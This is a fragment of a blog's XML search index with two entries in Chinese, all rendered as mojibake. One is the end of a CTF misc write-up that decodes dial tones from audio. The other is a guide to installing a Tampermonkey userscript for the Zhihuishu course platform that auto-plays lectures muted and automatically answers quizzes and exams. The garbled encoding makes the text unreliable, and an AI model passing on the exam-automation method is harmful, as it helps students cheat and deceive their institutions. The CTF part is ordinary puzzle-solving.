src="/img/jd4.png"><br>ç„¶åæŠŠä¸­é—´çš„èƒ½å¬åˆ°çš„éƒ¨åˆ†åˆ‡æ‰ï¼Œå°†å‰©ä¸‹çš„å¬ä¸åˆ°çš„éƒ¨åˆ†å¯¼å‡ºï¼Œç„¶åæ‰“å¼€AUã€‚<br>æ‰“å¼€AUåå¯¼å…¥æ–‡ä»¶ï¼Œçœ‹åˆ°éŸ³è½¨æ˜¯å¹³çš„ï¼Œäºæ˜¯æˆ‘ä»¬å¢åŠ åˆ†è´ã€‚<img src="/img/jd5.png"><br>ç»Ÿä¸€å¢åŠ åˆ†è´åï¼Œç”±äºå‰é¢ä¸€æ®µçš„å£°éŸ³å¤ªå°ï¼Œäºæ˜¯å¯¹å‰é¢ä¸€æ®µå•ç‹¬å¢åŠ åˆ†è´ã€‚<img src="/img/jd6.png"><br>è¿™æ ·å°±å¯ä»¥å¬æ¸…äº†ã€‚ç„¶åæ‰“å¼€æ‰‹æœºæ‹¨å·é”®ç›˜ï¼Œæ ¹æ®æ‹¨å·éŸ³ä»¥åŠä¹‹é—´çš„ç»†å¾®å·®åˆ«ï¼Œå¯ä»¥å¬å‡ºæ’­çš„å·ç ä¸º187485618521ã€‚æ ¹æ®å¼€å¤´å›¾ç‰‡ç»™çš„æç¤ºï¼Œé€šè¿‡base64åŠ å¯†åï¼Œå³å¯è·å¾—flag.</p><h2 id="é¢˜ç›®æ€»ç»“"><a href="#é¢˜ç›®æ€»ç»“" class="headerlink" title="é¢˜ç›®æ€»ç»“"></a>é¢˜ç›®æ€»ç»“</h2><p>è¿™é“é¢˜æ•´ä½“æ¥è¯´ä¸éš¾ã€‚ä½†æ˜¯åœ¨éŸ³é¢‘å¤„ç†çš„æ—¶å€™å¾ˆå¤šäººæƒ³ä¸åˆ°æ‹¨å·éŸ³ä»¥åŠæ”¾å¤§ã€‚åœ¨å¬æ‹¨å·éŸ³çš„æ—¶å€™å…¶å®å¯ä»¥ç”¨ä¸€äº›å·¥å…·ï¼Œä½†æ˜¯å¯¹éŸ³é¢‘åˆ†è´çš„å¤„ç†ä»¥åŠå™ªå£°å¯èƒ½ä¼šå¯¼è‡´å·¥å…·è¯†åˆ«é”™è¯¯ã€‚æ‰€ä»¥é‡‡ç”¨ç”¨è€³æœµå¬çš„æ–¹å¼ã€‚<br>åœ¨å¬çš„æ—¶å€™å…ˆå¬å‰äº”ä¸ªï¼Œè‡ªå·±å»æ‹¨å·æ¨¡æ‹Ÿä¸€ä¸‹ã€‚å‰äº”ä¸ªæ¯”è¾ƒå¥½ç¡®å®šã€‚<br>ç„¶åå¬æœ€åä¸‰ä¸ª åªæœ‰4ç§ç‰¹å®šçš„é”®ä½æ‰èƒ½å½¢æˆæœ€åä¸‰ä¸ªçš„éŸ³è°ƒã€‚ç„¶åä¸¤ä¸¤ç¡®å®šä¸­é—´çš„67 89ï¼Œå¤šæ¬¡å°è¯•åå³å¯è·å¾—æ­£ç¡®çš„ç»“æœã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¦‚ä½•ç§‘å­¦åœ°çœ‹ç½‘è¯¾(çŸ¥åˆ°)</title>
      <link href="2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/"/>
      <url>2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="ä½¿ç”¨è°·æ­Œæµè§ˆå™¨å®‰è£…æ²¹çŒ´æ’ä»¶"><a href="#ä½¿ç”¨è°·æ­Œæµè§ˆå™¨å®‰è£…æ²¹çŒ´æ’ä»¶" class="headerlink" title="ä½¿ç”¨è°·æ­Œæµè§ˆå™¨å®‰è£…æ²¹çŒ´æ’ä»¶"></a>ä½¿ç”¨è°·æ­Œæµè§ˆå™¨å®‰è£…æ²¹çŒ´æ’ä»¶</h2><p>ä» <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo">æ²¹çŒ´ä¸‹è½½é“¾æ¥</a> è·å–æ²¹çŒ´è„šæœ¬çš„æ’ä»¶(éœ€è¦ç§‘å­¦ä¸Šç½‘)ã€‚ä¸‹è½½åæ ¹æ®æç¤ºï¼Œå°†æ²¹çŒ´æ’ä»¶æ·»åŠ è‡³chromeæ‰©å±•ã€‚<br>æ·»åŠ è¿‡åå°±å¯ä»¥åœ¨åœ°å€æ å³ä¾§çœ‹åˆ°è¿™ä¸ªå›¾æ ‡ï¼š<img src="/img/1.png">ä»£è¡¨å®‰è£…æˆåŠŸã€‚<br>æ— éœ€ç§‘å­¦ä¸Šç½‘çš„æ–¹æ³•ï¼š<br>ä»<a href="https://chrome.zzzmh.cn/info?token=dhdgffkkebhmkfjojejmpbldmpobfkfo">å¢™å†…é“¾æ¥</a>è·å–æ²¹çŒ´è„šæœ¬.CRXæ–‡ä»¶ï¼Œç„¶ååœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥chrome://extensions æ·»åŠ .crxæ–‡ä»¶ã€‚<br>è¯¦ç»†æ·»åŠ æ•™ç¨‹è½¬è‡ª<a href="https://blog.csdn.net/u010520146/article/details/90665446">Chromeå®‰è£…CRXæ’ä»¶æ–¹æ³•</a></p><h2 id="è·å–çœ‹ç½‘è¯¾è„šæœ¬"><a href="#è·å–çœ‹ç½‘è¯¾è„šæœ¬" class="headerlink" title="è·å–çœ‹ç½‘è¯¾è„šæœ¬"></a>è·å–çœ‹ç½‘è¯¾è„šæœ¬</h2><p>éšåå•å‡»è¯¥å›¾æ ‡ï¼Œé€‰æ‹©è·å–æ–°è„šæœ¬ã€‚ç‚¹å‡»ç¬¬äºŒä¸ªâ€GreasyForkâ€ã€‚è¿›å…¥åæœç´¢â€æ™ºæ…§æ ‘ç½‘è¯¾åŠ©æ‰‹â€<img src="/img/gf.png">å•å‡»è¿›å…¥åï¼Œé€‰æ‹©å®‰è£…ã€‚<br>å®‰è£…åæ˜¯è¿™æ ·ï¼š<img src="/img/zhs.png">éšåæ‰“å¼€ç½‘è¯¾ç³»ç»Ÿï¼Œç™»é™†åç‚¹å¼€éœ€è¦çœ‹çš„ç½‘è¯¾å¯è‡ªåŠ¨1.5å€é€Ÿé™éŸ³æ’­æ”¾ã€‚</p><h2 id="è‡ªåŠ¨è€ƒè¯•"><a href="#è‡ªåŠ¨è€ƒè¯•" class="headerlink" title="è‡ªåŠ¨è€ƒè¯•"></a>è‡ªåŠ¨è€ƒè¯•</h2><p>è¯¥è„šæœ¬æœ€å¥½çš„åŠŸèƒ½(ä¸ªäººè®¤ä¸º)æ˜¯è‡ªåŠ¨è€ƒè¯•åŠŸèƒ½ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼šé€‰æ‹©ç« èŠ‚ä½œä¸š/è€ƒè¯•ï¼Œç‚¹è¿›å»åè„šæœ¬ä¼šè‡ªåŠ¨æœç´¢é¢˜ç›®ç­”æ¡ˆå¹¶ä¸”è‡ªåŠ¨é€‰æ‹©ï¼Œç­‰æ‰€æœ‰ç­”æ¡ˆæ£€ç´¢å®Œæ¯•åæäº¤å³å¯ã€‚<br><img src="/img/cj.png"></p><h3 id="åæ§½"><a href="#åæ§½" class="headerlink" title="åæ§½"></a>åæ§½</h3><p>æ™ºæ…§æ ‘å¹³å°ä¸ªäººæ„Ÿè§‰ä¸€èˆ¬ã€‚<br>1.ç™»é™†æ—¶ç•Œé¢ä¸å¤Ÿäººæ€§åŒ–ï¼Œè€Œä¸”é€‰æ‹©å­¦å·ç™»é™†æ—¶ï¼Œé€‰æ‹©å­¦æ ¡ï¼Œè¾“å…¥å®Œå­¦å·å¯†ç åæŒ‰å›è½¦ç™»å½•ä¼šè·³è½¬åˆ°æ‰‹æœºå·ç™»å½•ã€‚å†æ¬¡é€‰æ‹©å­¦å·ç™»å½•æ‰èƒ½æ­£å¸¸ç™»å½•ã€‚<br>2.æˆç»©åˆ†æç•Œé¢ çœ‹è¯¾ä¹ æƒ¯æ—¶é—´è½´é€†åºã€‚åšè¿™ä¸ªå›¾çš„ç¨‹åºå‘˜èµ·å¤œçº§æå§ :)ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚é¡¹ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
